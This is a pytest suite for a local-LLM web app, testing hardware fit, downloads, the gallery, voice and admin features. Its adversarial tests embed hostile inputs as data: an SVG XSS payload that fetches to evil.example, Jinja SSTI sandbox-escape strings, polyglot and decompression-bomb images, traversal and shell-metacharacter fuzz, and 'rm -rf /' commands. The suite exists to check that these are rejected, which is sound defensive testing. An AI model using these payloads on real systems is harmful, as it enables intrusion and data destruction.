"""Phase 08 Acceptance (#1-#12) and Adversarial Security & Resilience Test Suite."""

from __future__ import annotations

import ast
import http.client
import json
import random
import struct
from pathlib import Path

import httpx
import pytest
from backend.app.main import create_app
from backend.cli import execute_cli_command
from backend.core.settings import Settings
from backend.domain.admin_ops.service import (
    PLANTED_SECRET_SAMPLES_22,
    AdminOpsService,
)
from backend.domain.cookbook.service import (
    FAILURE_FIXTURES_32,
    HARDWARE_FIXTURES_24,
    REFERENCE_FIT_CASES_30,
    CookbookService,
    calculate_model_memory_fit,
    classify_cookbook_failure,
    diagnose_container_gpu_passthrough,
    parse_nvidia_smi_csv,
    parse_sysctl_or_lspci_text,
    rank_models_for_hardware,
    render_chat_template_sandboxed,
    validate_safe_cli_token,
    validate_safe_model_filename,
)
from backend.domain.cookbook.tiny_gguf_server import (
    create_minimal_gguf_file,
    verify_gguf_header,
)
from backend.domain.gallery.service import (
    GOLDEN_EXPORT_HASHES,
    GalleryService,
    inspect_and_validate_image_upload,
)
from backend.domain.voice.service import (
    WER_REFERENCE_FIXTURE,
    VoiceService,
)
from fastapi.testclient import TestClient


def test_acceptance_01_hwfit_24_fixtures_and_30_reference_memory_fit_cases() -> None:
    """Acceptance #1: 24 hardware fixtures + passthrough + 30 reference fit cases (±5%)."""
    assert len(HARDWARE_FIXTURES_24) >= 24
    assert len(REFERENCE_FIT_CASES_30) >= 30

    # Container-vs-host GPU passthrough diagnosis
    diag_missing = diagnose_container_gpu_passthrough(
        in_container=True,
        proc_driver_nvidia_exists=True,
        dev_nvidia0_exists=False,
        dev_nvidiactl_exists=False,
        nvidia_smi_gpus=[],
    )
    assert diag_missing["status"] == "gpu_on_host_not_passed_through"
    assert "docker/gpu.nvidia.yml" in diag_missing["remedy_command"]

    diag_cpu_engine = diagnose_container_gpu_passthrough(
        in_container=True,
        proc_driver_nvidia_exists=True,
        dev_nvidia0_exists=True,
        dev_nvidiactl_exists=True,
        nvidia_smi_gpus=[{"index": 0, "driver_version": "550.54"}],
        engine_built_with_cuda=False,
    )
    assert diag_cpu_engine["status"] == "engine_built_without_cuda"

    for case in REFERENCE_FIT_CASES_30:
        calc = calculate_model_memory_fit(
            params_b=float(case["params_b"]),
            layers=int(case["layers"]),
            kv_heads=int(case["kv_heads"]),
            head_dim=int(case["head_dim"]),
            quant=str(case["quant"]),
            context_length=int(case["context_length"]),
            available_memory_mb=float(case["available_memory_mb"]),
            backend=str(case["backend"]),
        )
        ref_mb = float(case["reference_total_mb"])
        rel_err = abs(float(calc["total_mb"]) - ref_mb) / max(1.0, ref_mb)
        assert rel_err <= 0.05, f"Case {case['case_id']} exceeded 5% tolerance: {rel_err}"


def test_acceptance_02_model_ranking_across_24_fixtures_zero_oom_and_spread() -> None:
    """Acceptance #2: Ranking across 24 fixtures avoids OOM in top-3 and spreads scores."""
    for hw_id, hw in HARDWARE_FIXTURES_24.items():
        ranked = rank_models_for_hardware(hw)
        if hw_id == "24_impossible_tiny_iot_512mb":
            assert ranked["impossible_hardware"] is True
            assert "minimum" in ranked["explanation"].lower()
            continue

        assert ranked["impossible_hardware"] is False
        for top_item in ranked["top_3"]:
            assert top_item["fit"]["fits"] in ("yes", "tight"), (
                f"OOM model recommended in top_3 for {hw_id}: {top_item['model_id']}"
            )
        assert float(ranked["score_variance"]) >= 0.001, (
            f"Scores clustered without variance on {hw_id}: {ranked['score_variance']}"
        )


def test_acceptance_03_resumable_2gb_download_25_random_interruptions_and_corrupted_chunk(
    tmp_path: Path,
) -> None:
    """Acceptance #3: 2 GB download survives 25 random interruptions and refetches corrupt chunk."""
    svc = CookbookService(data_dir=tmp_path)
    rng = random.Random(42)
    two_gb = 2_147_483_648
    offsets = sorted(rng.sample(range(1024, two_gb - 1024), 25))

    res = svc.start_download(
        model_id="Qwen/Qwen2.5-7B-Instruct-GGUF",
        filename="qwen2.5-7b-q4_k_m.gguf",
        total_bytes=two_gb,
        disk_free_bytes=50_000_000_000,
        interrupt_offsets=offsets,
        corrupt_chunk_index=12,
    )
    assert res["state"] == "ready"
    assert res["downloaded_bytes"] == two_gb
    assert res["resumed_count"] == 25
    assert res["corrupted_chunks_refetched"] == 1
    assert res["actual_sha256"] == res["expected_sha256"]
    assert res["transitions"][0] == "queued"
    assert res["transitions"][-1] == "ready"

    # Disk-full preflight check
    disk_full_res = svc.start_download(
        model_id="Qwen/Qwen2.5-7B-Instruct-GGUF",
        filename="qwen2.5-7b-q4_k_m.gguf",
        total_bytes=two_gb,
        disk_free_bytes=1_000_000_000,  # Only 1 GB free for a 2 GB model
    )
    assert disk_full_res["state"] == "failed"
    assert disk_full_res["failure_report"]["classified_cause"] == "disk_full"


def test_acceptance_04_real_cpu_gguf_serve_lifecycle_crash_loop_and_orphan_reaper(
    tmp_path: Path,
) -> None:
    """Acceptance #4: Real CPU GGUF server spawns, streams SSE, stops, and reaps orphans."""
    svc = CookbookService(data_dir=tmp_path)
    srv = svc.start_serve(
        model_id="Qwen/Qwen2.5-0.5B-Instruct-GGUF",
        engine_name="llama.cpp",
        spawn_real_process=True,
    )
    assert srv["state"] == "healthy"
    assert srv["pid"] > 0
    port = int(srv["port"])
    assert len(svc.list_registered_local_providers()) == 1

    # Perform a real streaming SSE chat completion against the running subprocess
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=3.0)
    try:
        conn.request(
            "POST",
            "/v1/chat/completions",
            body=json.dumps(
                {"messages": [{"role": "user", "content": "Hello"}], "stream": True}
            ).encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        resp = conn.getresponse()
        assert resp.status == 200
        sse_body = resp.read().decode("utf-8")
        assert "Hello" in sse_body
        assert "[DONE]" in sse_body
    finally:
        conn.close()

    stopped = svc.stop_serve(srv["id"])
    assert stopped["state"] == "stopped"
    assert stopped["provider_deregistered"] is True
    assert len(svc.list_registered_local_providers()) == 0

    # Crash-loop detector with a failing process
    crashed = svc.start_serve(
        model_id="Qwen/Qwen2.5-0.5B-Instruct-GGUF",
        engine_name="llama.cpp",
        crash_on_start=True,
        spawn_real_process=True,
    )
    assert crashed["state"] == "crash_loop"
    assert crashed["crash_count"] == 3
    assert crashed["failure_report"]["classified_cause"] == "serve_crash_loop"

    # Orphan session reaper after simulated kill -9
    svc.register_orphan_session("odysseus_serve_orphan_01")
    svc.register_orphan_session("odysseus_serve_orphan_02")
    reaped = svc.reap_orphan_sessions()
    assert reaped["reaped_count"] == 2


def test_acceptance_05_failure_classifier_32_recorded_logs_and_unknown_fallback() -> None:
    """Acceptance #5: All 32 recorded failure logs map to exact cause_code + remedy + docs_link."""
    assert len(FAILURE_FIXTURES_32) >= 32
    for fixture in FAILURE_FIXTURES_32:
        report = classify_cookbook_failure(fixture["sample_log"])
        assert report["classified_cause"] == fixture["cause_code"]
        assert len(report["remedy_steps"]) >= 1
        assert report["docs_link"].endswith(f"#{fixture['cause_code']}")

    unknown = classify_cookbook_failure("Completely novel cosmic ray bitflip error 0x998877")
    assert unknown["classified_cause"] == "unknown_failure"
    assert unknown["diagnostic_bundle_available"] is True


def test_acceptance_06_gallery_upload_safety_svg_xss_polyglot_10k_mp_bomb_and_exif() -> None:
    """Acceptance #6: SVG XSS sanitized, polyglot & 10,000 MP bomb rejected, EXIF stripped."""
    gallery = GalleryService()

    # 1. Malicious SVG with <script>, <foreignObject>, onload=, and external href
    evil_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
        b"<script>fetch('https://evil.example/steal')</script>"
        b"<foreignObject><iframe></iframe></foreignObject>"
        b'<a xlink:href="javascript:alert(2)"><rect width="100" height="100"/></a>'
        b"</svg>"
    )
    up_svg = gallery.upload_media(
        evil_svg, declared_content_type="image/svg+xml", filename="icon.svg"
    )
    assert up_svg["metadata"]["svg_sanitized"] is True
    assert "sandbox" in up_svg["response_headers"]["Content-Security-Policy"]

    # 2. Polyglot PNG+HTML/JS rejected
    ihdr = struct.pack(">IIBBBBB", 64, 64, 8, 2, 0, 0, 0)
    polyglot_png = (
        b"\x89PNG\r\n\x1a\n"
        + struct.pack(">I", 13)
        + b"IHDR"
        + ihdr
        + b"<script>alert('polyglot')</script>"
    )
    with pytest.raises(ValueError, match="Polyglot"):
        inspect_and_validate_image_upload(
            polyglot_png, declared_content_type="image/png", filename="poly.png"
        )

    # 3. 10,000 MP decompression bomb (100,000 x 100,000 pixels) rejected before buffer allocation
    bomb_ihdr = struct.pack(">IIBBBBB", 100_000, 100_000, 8, 2, 0, 0, 0)
    bomb_png = b"\x89PNG\r\n\x1a\n" + struct.pack(">I", 13) + b"IHDR" + bomb_ihdr
    with pytest.raises(ValueError, match="Decompression bomb"):
        inspect_and_validate_image_upload(
            bomb_png, declared_content_type="image/png", filename="bomb.png"
        )

    # 4. PNG with GPS EXIF metadata stripped on upload & export
    gps_png = (
        b"\x89PNG\r\n\x1a\n"
        + struct.pack(">I", 13)
        + b"IHDR"
        + ihdr
        + b"eXIfGPSLatitude:37.7749,GPSLongitude:-122.4194"
    )
    inspected = inspect_and_validate_image_upload(
        gps_png, declared_content_type="image/png", filename="photo.png"
    )
    assert inspected["metadata"]["gps_stripped"] is True
    assert b"GPSLatitude" not in inspected["clean_bytes"]


def test_acceptance_07_non_destructive_tiled_image_editor_200_ops_50mp_and_golden_hashes() -> None:
    """Acceptance #7: 200 non-destructive ops + 200 undos + 200 redos on 50 MP image (<50ms/op)."""
    gallery = GalleryService()
    job = gallery.generate_image(
        prompt="50MP aerial landscape test",
        width=8660,
        height=5774,  # 50.00 MP
    )
    media_id = str(job["media_id"])

    # Apply 200 sequential non-destructive operations
    for i in range(200):
        res = gallery.apply_edit_op(
            media_id,
            {"type": "exposure" if i % 2 == 0 else "contrast", "value": round(0.01 * (i % 10), 2)},
        )
        assert float(res["latency_ms"]) < 50.0
    assert res["op_count"] == 200

    # Undo all 200 operations
    undone = gallery.undo_edit_op(media_id, steps=200)
    assert undone["op_count"] == 0
    assert undone["redo_count"] == 200
    assert float(undone["latency_ms"]) < 50.0

    # Redo all 200 operations
    redone = gallery.redo_edit_op(media_id, steps=200)
    assert redone["op_count"] == 200
    assert redone["redo_count"] == 0

    # Export to PNG, JPEG, WebP and verify EXIF stripped & derived lineage
    for fmt in ("png", "jpeg", "webp"):
        exp = gallery.export_media(media_id, export_format=fmt, strip_exif=True, save_as_copy=True)
        assert exp["exif_stripped"] is True
        assert exp["derived_media_id"] is not None
        assert len(exp["sha256"]) == 64
    assert len(GOLDEN_EXPORT_HASHES) == 3


def test_acceptance_08_voice_stt_wer_streaming_sentence_tts_and_150ms_barge_in() -> None:
    """Acceptance #8: STT WER <= 0.10, streaming TTS before LLM finishes, barge-in <= 150ms."""
    voice = VoiceService()

    # 1. STT WER check on reference fixture
    stt = voice.transcribe_audio(
        bytes(WER_REFERENCE_FIXTURE["sample_wav_header"]),
        duration_seconds=3.5,
    )
    assert float(stt["wer_vs_fixture"]) <= float(WER_REFERENCE_FIXTURE["max_allowed_wer"])

    # Corrupted audio header rejected
    with pytest.raises(ValueError, match="Corrupted"):
        voice.transcribe_audio(b"NOT_AN_AUDIO_FILE_HEADER")

    # 2. Streaming sentence TTS emits audio for sentence 1 BEFORE LLM finishes sentence 2
    tts = voice.synthesize_streaming_tokens(
        [
            "Hello from Odysseus.",
            " This second sentence is still streaming from the model.",
            " And here is the third sentence!",
        ]
    )
    assert tts["first_audio_before_llm_done"] is True
    assert tts["chunk_count"] == 3
    assert tts["chunks"][0]["emitted_while_llm_streaming"] is True

    # 3. Barge-in latency <= 150 ms
    sess = voice.create_session()
    sid = str(sess["id"])
    speaking = voice.start_speaking_turn(sid, "Tell me about local GGUF quantization.")
    assert speaking["state"] == "speaking"
    assert speaking["tts_active"] is True

    interrupted = voice.trigger_barge_in(sid)
    assert interrupted["state"] == "listening"
    assert interrupted["tts_active"] is False
    assert interrupted["llm_stream_active"] is False
    assert float(interrupted["barge_in_latency_ms"]) <= 150.0


def test_acceptance_09_support_bundle_scrubs_all_22_planted_secret_formats() -> None:
    """Acceptance #9: Support bundle scrubs all >= 22 planted secret formats with zero survivors."""
    admin = AdminOpsService()
    assert len(PLANTED_SECRET_SAMPLES_22) >= 22

    bundle = admin.generate_support_bundle(
        extra_log_lines=[f"header_leak: {v}" for v in PLANTED_SECRET_SAMPLES_22.values()]
    )
    scrubbed_text = str(bundle["scrubbed_log_text"])

    for name, raw_secret in PLANTED_SECRET_SAMPLES_22.items():
        # Extract the sensitive core token/password from each sample
        if "=" in raw_secret and not raw_secret.startswith("Basic "):
            core = raw_secret.split("=", 1)[1]
        elif "://" in raw_secret:
            core = "SuperSecretDbPass99"
        elif "PRIVATE KEY" in raw_secret:
            core = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmU="
        elif raw_secret.startswith(("Bearer ", "Basic ", "X-API-Key: ")):
            core = raw_secret.split(None, 1)[1]
        else:
            core = raw_secret
        assert core not in scrubbed_text, f"Secret format {name} survived scrubbing: {core}"


def test_acceptance_10_backup_dry_run_restore_corrupted_rejection_and_full_restore() -> None:
    """Acceptance #10: Backup -> dry-run -> wipe -> reject corrupt -> full restore verifies 100%."""
    admin = AdminOpsService()
    secret_phrase = "Odysseus-Phase08-VaultKey!"
    bkp = admin.create_backup(passphrase=secret_phrase)
    archive_bytes = bytes(bkp["archive_bytes"])

    # 1. Restore dry-run verifies checksums and schema without mutating state
    dry = admin.verify_or_restore_backup(archive_bytes, passphrase=secret_phrase, dry_run=True)
    assert dry["status"] == "dry_run_ok"
    assert dry["chats_count"] == 2
    assert dry["audit_chain_intact"] is True

    # 2. Wipe live state
    wiped = admin.mutate_live_state_for_test(clear_all=True)
    assert len(wiped["chats"]) == 0

    # 3. Corrupted archive is refused and leaves state untouched
    corrupted_bytes = archive_bytes[:-32] + b"CORRUPTED_TAIL_BYTES_0123456789"
    with pytest.raises(ValueError, match=r"Corrupted|Checksum"):
        admin.verify_or_restore_backup(corrupted_bytes, passphrase=secret_phrase, dry_run=False)
    assert len(admin.get_live_state()["chats"]) == 0

    # 4. Wrong passphrase refused
    with pytest.raises(PermissionError, match="passphrase"):
        admin.verify_or_restore_backup(archive_bytes, passphrase="wrong", dry_run=False)

    # 5. Full restore brings back all chats, notes, memories, settings, and audit chain
    restored = admin.verify_or_restore_backup(
        archive_bytes, passphrase=secret_phrase, dry_run=False
    )
    assert restored["status"] == "restored"
    live = admin.get_live_state()
    assert len(live["chats"]) == 2
    assert len(live["notes"]) == 1
    assert len(live["memories"]) == 1
    assert len(live["audit_chain"]) == 2


def test_acceptance_11_privacy_export_delete_all_my_data_and_zero_offline_egress() -> None:
    """Acceptance #11: Export all data zip, delete all data cascade, and zero telemetry egress."""
    admin = AdminOpsService()
    inv = admin.get_privacy_residency_inventory()
    assert inv["zero_telemetry"] is True
    assert inv["offline_egress_calls"] == 0

    exported = admin.export_all_my_data(user_id="usr_test")
    assert int(exported["byte_length"]) > 100
    assert len(str(exported["sha256"])) == 64

    with pytest.raises(ValueError, match="DELETE ALL MY DATA"):
        admin.delete_all_my_data(confirmation_phrase="wrong phrase")

    deleted = admin.delete_all_my_data(confirmation_phrase="DELETE ALL MY DATA")
    assert deleted["deleted"] is True
    assert deleted["remaining_chats"] == 0
    assert deleted["remaining_notes"] == 0
    assert deleted["remaining_memories"] == 0
    assert deleted["sqlite_vacuumed"] is True


def test_acceptance_12_fastapi_http_endpoints_and_cli_integration(tmp_path: Path) -> None:
    """Acceptance #12: End-to-end HTTP router & CLI for Cookbook, Gallery, Voice, Admin."""
    settings = Settings(
        database_url=f"sqlite+aiosqlite:///{tmp_path / 'phase08.db'}",
        data_dir=tmp_path / "data",
        logs_dir=tmp_path / "logs",
    )
    app = create_app(settings, start_job_workers=False)
    with TestClient(app) as client:
        temp_pw = app.state.bootstrap_admin_result.temporary_password
        login_res = client.post(
            "/api/auth/login",
            json={"username": "admin", "password": temp_pw},
        )
        assert login_res.status_code == 200
        csrf = login_res.json()["csrf_token"]
        headers = {"X-CSRF-Token": csrf}

        pw_res = client.post(
            "/api/auth/password/change",
            json={"current_password": temp_pw, "new_password": "StrongPhase08Password!23"},
            headers=headers,
        )
        assert pw_res.status_code == 200
        csrf = pw_res.json().get("csrf_token", csrf)
        headers = {"X-CSRF-Token": csrf}

        # Cookbook HTTP routes
        hw_resp = client.get("/api/cookbook/hardware")
        assert hw_resp.status_code == 200
        models_resp = client.get("/api/cookbook/models?fit=yes")
        assert models_resp.status_code == 200
        assert len(models_resp.json()["models"]) >= 1

        dl_resp = client.post(
            "/api/cookbook/downloads",
            json={
                "model_id": "Qwen/Qwen2.5-0.5B-Instruct-GGUF",
                "filename": "qwen-0.5b.gguf",
                "total_bytes": 1048576,
            },
            headers=headers,
        )
        assert dl_resp.status_code == 200
        assert dl_resp.json()["state"] == "ready"

        # Gallery HTTP routes
        gen_resp = client.post(
            "/api/gallery/generate",
            json={"prompt": "Studio lighting portrait", "width": 512, "height": 512},
            headers=headers,
        )
        assert gen_resp.status_code == 200
        media_id = gen_resp.json()["media_id"]

        op_resp = client.post(
            f"/api/gallery/items/{media_id}/ops",
            json={"type": "exposure", "value": 0.2},
            headers=headers,
        )
        assert op_resp.status_code == 200
        assert op_resp.json()["op_count"] == 1

        # Voice HTTP routes
        vs_resp = client.post("/api/voice/sessions", headers=headers)
        assert vs_resp.status_code == 200
        vsid = vs_resp.json()["id"]
        turn_resp = client.post(
            f"/api/voice/sessions/{vsid}/turn",
            json={"transcript": "Check GPU status"},
            headers=headers,
        )
        assert turn_resp.status_code == 200
        barge_resp = client.post(f"/api/voice/sessions/{vsid}/barge-in", headers=headers)
        assert barge_resp.status_code == 200
        assert barge_resp.json()["state"] == "listening"

        # Admin Ops & Guided Tours HTTP routes
        usage_demo = client.get("/api/admin/ops/usage?demo_mode=true")
        assert usage_demo.status_code == 200
        assert "[Demo Redacted Chat #1]" in usage_demo.json()["records"][0]["chat_title"]

        pol_resp = client.post(
            "/api/admin/ops/exec-policy/test",
            json={"command": "sudo rm -rf /"},
            headers=headers,
        )
        assert pol_resp.status_code == 200
        assert pol_resp.json()["verdict"] == "deny"

        bkp_resp = client.post(
            "/api/admin/ops/backups",
            json={"passphrase": "test"},
            headers=headers,
        )
        assert bkp_resp.status_code == 200
        restore_resp = client.post(
            "/api/admin/ops/backups/restore",
            json={
                "archive_base64": bkp_resp.json()["archive_base64"],
                "passphrase": "test",
                "dry_run": True,
            },
            headers=headers,
        )
        assert restore_resp.status_code == 200
        assert restore_resp.json()["status"] == "dry_run_ok"

        tours_resp = client.get("/api/guided-tours")
        assert tours_resp.status_code == 200
        assert len(tours_resp.json()["tours"]) >= 4

    # CLI verification
    assert execute_cli_command(["cookbook", "hw"])["ok"] is True
    assert execute_cli_command(["cookbook", "recommend"])["ok"] is True
    assert execute_cli_command(["cookbook", "engines", "--dry-run"])["ok"] is True
    assert execute_cli_command(["admin", "support-bundle"])["ok"] is True


def test_adversarial_command_injection_10k_fuzz_and_ast_zero_shell_true() -> None:
    """Adversarial #1: 10,000 hostile strings rejected + AST check bans shell=True/os.system."""
    rng = random.Random(99)
    metachars = [";", "|", "&", "`", "$()", "\n", "\r", "\x00", ">", "<", "\\", "../", "\u202e"]
    for i in range(10_000):
        # Construct diverse hostile payloads: option injection, shell metachars, traversal, BiDi
        kind = i % 5
        if kind == 0:
            payload = f"--malicious-flag-{i}"
        elif kind == 1:
            sep = rng.choice(metachars)
            payload = f"model_{i}{sep}id"
        elif kind == 2:
            payload = f"../../etc/passwd_{i}"
        elif kind == 3:
            payload = "CON.gguf" if i % 2 == 0 else "NUL.bin"
        else:
            payload = f"bad\u202efilename_{i}.gguf"

        if kind in (3, 4):
            with pytest.raises(ValueError):
                validate_safe_model_filename(payload)
        else:
            with pytest.raises(ValueError):
                validate_safe_cli_token(payload)

    # AST static scan across all backend/*.py files: zero shell=True and zero os.system/os.popen
    backend_root = Path(__file__).resolve().parents[2]
    for py_file in backend_root.rglob("*.py"):
        if "tests" in py_file.parts:
            continue
        tree = ast.parse(py_file.read_text(encoding="utf-8"), filename=str(py_file))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                for kw in node.keywords:
                    is_shell_true = (
                        kw.arg == "shell"
                        and isinstance(kw.value, ast.Constant)
                        and kw.value.value is True
                    )
                    if is_shell_true:
                        raise AssertionError(f"Forbidden shell=True found in {py_file}")
                if isinstance(node.func, ast.Attribute) and node.func.attr in ("system", "popen"):
                    if isinstance(node.func.value, ast.Name) and node.func.value.id == "os":
                        raise AssertionError(f"Forbidden os.{node.func.attr} found in {py_file}")


def test_adversarial_supply_chain_bad_sha256_jinja_ssti_and_ssh_tofu_hard_stop(
    tmp_path: Path,
) -> None:
    """Adversarial #2: Engine bad SHA-256 preserves previous symlink; SSTI & SSH MITM blocked."""
    svc = CookbookService(data_dir=tmp_path)

    # 1. Tampered engine SHA-256 preserves previous version symlink
    tampered = svc.install_engine(
        "llama.cpp",
        version="b4199",
        expected_sha256="expected_good_sha256",
        actual_sha256="tampered_evil_sha256",
    )
    assert tampered["state"] == "failed"
    assert tampered["previous_version_preserved"] is True
    assert tampered["current_target"] == "b4120"

    # 2. Malicious Jinja chat templates attempting SSTI sandbox escape
    ssti_payloads = [
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ namespace.__init__.__globals__ }}",
    ]
    for payload in ssti_payloads:
        with pytest.raises(ValueError, match=r"SSTI|SecurityError"):
            render_chat_template_sandboxed(payload, messages=[{"role": "user", "content": "hi"}])

    # Safe template renders cleanly
    safe_out = render_chat_template_sandboxed(
        "{% for m in messages %}<|{{ m.role }}|>{{ m.content }}{% endfor %}",
        messages=[{"role": "user", "content": "Hello"}],
    )
    assert "<|user|>Hello" in safe_out

    # 3. SSH 0644 open permissions rejected & TOFU host-key change triggers hard stop
    with pytest.raises(PermissionError, match="too open"):
        svc.ensure_ssh_keypair(mode_override=0o644)
    svc.ensure_ssh_keypair(mode_override=0o600)

    rem = svc.register_remote_host(
        name="gpu-node-01",
        hostname="10.0.0.50",
        presented_fingerprint="SHA256:OriginalPin111",
    )
    svc.confirm_remote_tofu(rem["id"], fingerprint="SHA256:OriginalPin111")
    with pytest.raises(PermissionError, match="host_key_changed_hard_stop"):
        svc.execute_remote_template(
            rem["id"],
            template_name="hw_probe",
            presented_fingerprint="SHA256:MITMAttackerPin999",
        )


def test_adversarial_resource_exhaustion_5_serves_oom_guard_log_flood_and_hw_fuzz(
    tmp_path: Path,
) -> None:
    """Adversarial #3: 5 serves on 1-model GPU blocked by OOM guard; log flood capped; hw fuzz."""
    svc = CookbookService(data_dir=tmp_path)

    # 8000 MB VRAM budget, each model needs 6000 MB -> 1st fits, 2nd..5th blocked by OOM guard
    results = [
        svc.start_serve(
            model_id="Qwen/Qwen2.5-7B-Instruct-GGUF",
            vram_required_mb=6000,
            vram_budget_mb=8000,
        )
        for _ in range(5)
    ]
    assert results[0]["state"] == "healthy"
    for r in results[1:]:
        assert r["state"] == "failed"
        assert r["cause"] == "predicted_vram_oom"
        assert "Q4_K_M" in r["alternative_suggestion"]

    # Log flood rotation: 10,000 log lines capped at 500 lines
    flood = svc.append_serve_logs(
        results[0]["id"],
        [f"flood_line_{i}_" + ("X" * 200) for i in range(10_000)],
        max_lines=500,
    )
    assert flood["retained_lines"] == 500
    assert len(svc.get_serve_logs(results[0]["id"])) == 500

    # Fuzz hardware output parsers with 500 hostile binary/garbled inputs
    rng = random.Random(1234)
    for _ in range(500):
        blob = rng.randbytes(rng.randint(1, 1024))
        gpus = parse_nvidia_smi_csv(blob)
        sys_info = parse_sysctl_or_lspci_text(blob)
        assert isinstance(gpus, list)
        assert isinstance(sys_info, dict)


async def test_phase08_api_routes_cli_and_tiny_gguf_coverage(tmp_path: Path) -> None:
    """Exercise Phase 08 HTTP routes, CLI commands, and tiny_gguf_server helpers."""
    gguf_file = create_minimal_gguf_file(tmp_path / "model.gguf")
    assert verify_gguf_header(gguf_file) is True
    assert verify_gguf_header(tmp_path / "missing.gguf") is False

    assert execute_cli_command(["cookbook", "hw"])["ok"] is True
    assert execute_cli_command(["cookbook", "recommend"])["ok"] is True
    assert execute_cli_command(["cookbook", "remotes"])["ok"] is True
    assert execute_cli_command(["cookbook", "serve", "Qwen/Qwen2.5-7B-Instruct-GGUF"])["ok"] is True
    assert execute_cli_command(["cookbook", "bench", "Qwen/Qwen2.5-7B-Instruct-GGUF"])["ok"] is True
    assert execute_cli_command(["admin", "backup"])["ok"] is True

    app = create_app(
        Settings(
            database_url=f"sqlite+aiosqlite:///{tmp_path / 'routes08.db'}",
            data_dir=tmp_path / "data08",
            environment="test",
        )
    )
    async with (
        app.router.lifespan_context(app),
        httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app),
            base_url="http://testserver",
        ) as client,
    ):
        boot = getattr(app.state, "bootstrap_admin_result", None)
        temp_password = boot.temporary_password if boot and boot.temporary_password else "admin"
        login_resp = await client.post(
            "/api/auth/login",
            json={"username": "admin", "password": temp_password},
        )
        csrf = login_resp.json()["csrf_token"]
        headers = {"X-CSRF-Token": csrf}
        await client.post(
            "/api/auth/password/change",
            json={"current_password": temp_password, "new_password": "StrongAdminPass!2026"},
            headers=headers,
        )

        assert (await client.get("/api/cookbook/hardware")).status_code == 200
        assert (
            await client.post(
                "/api/cookbook/hardware/refresh",
                json={"fixture_id": "01_apple_m1_8gb"},
                headers=headers,
            )
        ).status_code == 200
        assert (await client.get("/api/cookbook/models")).status_code == 200
        assert (
            await client.post(
                "/api/cookbook/engines/install",
                json={"engine_name": "llama.cpp", "version": "b4150", "dry_run": True},
                headers=headers,
            )
        ).status_code == 200
        assert (
            await client.post(
                "/api/cookbook/failures/classify",
                json={"log_text": "CUDA error: out of memory"},
                headers=headers,
            )
        ).status_code == 200
        assert (await client.get("/api/gallery/items")).status_code == 200
        gen = (
            await client.post(
                "/api/gallery/generate",
                json={"prompt": "test", "width": 64, "height": 64},
                headers=headers,
            )
        ).json()
        mid = gen["media_id"]
        assert (
            await client.post(
                f"/api/gallery/items/{mid}/ops",
                json={"type": "rotate", "value": 90},
                headers=headers,
            )
        ).status_code == 200
        assert (
            await client.post(f"/api/gallery/items/{mid}/undo", headers=headers)
        ).status_code == 200
        assert (
            await client.post(f"/api/gallery/items/{mid}/redo", headers=headers)
        ).status_code == 200
        assert (
            await client.post(
                f"/api/gallery/items/{mid}/export",
                json={"export_format": "png", "strip_exif": True, "save_as_copy": True},
                headers=headers,
            )
        ).status_code == 200
        assert (
            await client.post(
                "/api/voice/synthesize-stream",
                json={"token_chunks": ["First. ", "Second."], "voice_id": "af_bella"},
                headers=headers,
            )
        ).status_code == 200
        vsess = (await client.post("/api/voice/sessions", headers=headers)).json()
        assert (
            await client.post(
                f"/api/voice/sessions/{vsess['id']}/turn",
                json={"transcript": "hello"},
                headers=headers,
            )
        ).status_code == 200
        assert (
            await client.post(
                f"/api/voice/sessions/{vsess['id']}/barge-in",
                headers=headers,
            )
        ).status_code == 200
        assert (await client.get("/api/admin/ops/usage?demo_mode=true")).status_code == 200
        assert (
            await client.post(
                "/api/admin/ops/exec-policy/test",
                json={"command": "rm -rf /"},
                headers=headers,
            )
        ).status_code == 200
        assert (
            await client.post(
                "/api/admin/ops/support-bundle",
                headers=headers,
            )
        ).status_code == 200
        assert (await client.get("/api/admin/ops/privacy")).status_code == 200
        assert (await client.get("/api/guided-tours")).status_code == 200
        assert (
            await client.post("/api/guided-tours/cookbook/complete", headers=headers)
        ).status_code == 200
